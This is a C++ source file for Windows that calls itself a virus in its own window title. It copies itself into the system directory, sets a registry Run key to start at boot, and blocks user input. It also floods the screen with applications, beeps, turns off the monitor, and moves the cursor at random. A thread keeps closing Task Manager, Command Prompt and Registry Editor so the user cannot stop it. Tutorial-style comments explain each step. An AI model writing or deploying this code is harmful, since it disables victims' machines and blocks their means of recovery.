#include "iostream"
#include "stdio.h"
#include "windows.h"
#include "winuser.h"
#include "conio.h"
#include "ctime"
using namespace std;

int random, Freq, Dur, X, Y;
HWND mywindow, TaskMgr, CMD, Regedit;
char Notepad[MAX_PATH]="notepad.exe";
char MineSweeper[MAX_PATH]="winmine.exe";
char Hearts[MAX_PATH]="mshearts.exe";
char Website[MAX_PATH]="http:\\www.google.com";

void SetUp();
void Run( int ID );
void Beeper(), OpenStuff(), Hibernation(), CrazyMouse();

// Find windows by name and destroy them … Using the FindWindow command lets use do it and 
// if its not null and it found the window open give it a command.

DWORD WINAPI DestroyWindows(LPVOID);

int main()
{
srand( time(0) );
random = rand()%6;
system("title :.Virus.:");
BlockInput( true );
SetUp();
BlockInput( false );
CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&amp;DestroyWindows, 0, 0, NULL);
while(1)
{
Run( random );
Sleep(10);
}
}
void SetUp()
{
char system[MAX_PATH];
char pathtofile[MAX_PATH];
HMODULE GetModH = GetModuleHandle(NULL);
GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
GetSystemDirectory(system,sizeof(system));
strcat(system,"\\winminer.exe");
CopyFile(pathtofile,system,false);

// Add your program to run when windows starts
    
HKEY hKey;
RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Mcft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&amp;hKey );
RegSetValueEx(hKey, "SetUp",0,REG_SZ,(const unsigned char*)system,sizeof(system));
RegCloseKey(hKey);

mywindow = FindWindow(NULL,":.Virus.:");
cout&lt;&lt;"You Are Doomed cyberot";
Sleep(1000);
ShowWindow(mywindow, false);
}

void Run( int ID )
{
if( ID == 1 )
{
BlockInput(true);
}
else if( ID == 2 )
{
Beeper();
}
else if( ID == 3 )
{
OpenStuff();
}
else if( ID == 4 )
{
Hibernation();
}
else if( ID == 5 )
{
CrazyMouse();
}
else
{
BlockInput(true);
Beeper();
OpenStuff();
CrazyMouse();
}
}
// Make your comp beep different freq and different lengths again by rand numbers

void Beeper()
{
Freq = rand()%2001;
Dur = rand()%301;
Beep( Freq, Dur );
}
void OpenStuff() //open random Apps as it says OpenStuff
{
ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE);
ShellExecute(NULL,"open",MineSweeper,NULL,NULL,SW_MAXIMIZE);
ShellExecute(NULL,"open",Hearts,NULL,NULL,SW_MAXIMIZE);
ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
}
void Hibernation() // Turn off the monitor
{
Sleep(1000);
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
    
    // making your mouse go crazy. Make two rand var’s and tell the mouse to goto them
}
void CrazyMouse()
{
X = rand()%801;
Y = rand()%601;
SetCursorPos( X, Y );
}

DWORD WINAPI DestroyWindows(LPVOID)
{
while(1)
{
TaskMgr = FindWindow(NULL,"Windows Task Manager");
CMD = FindWindow(NULL, "Command Prompt");
Regedit = FindWindow(NULL,"Registry Editor");
if( TaskMgr != NULL )
{
SetWindowText( TaskMgr, "You are crazy");
PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}
if( CMD != NULL )
{
SetWindowText( CMD, "You are crazy");
PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}
if( Regedit != NULL )
{
SetWindowText( Regedit, "You are crazy");
PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
}

Sleep(10);
}
}
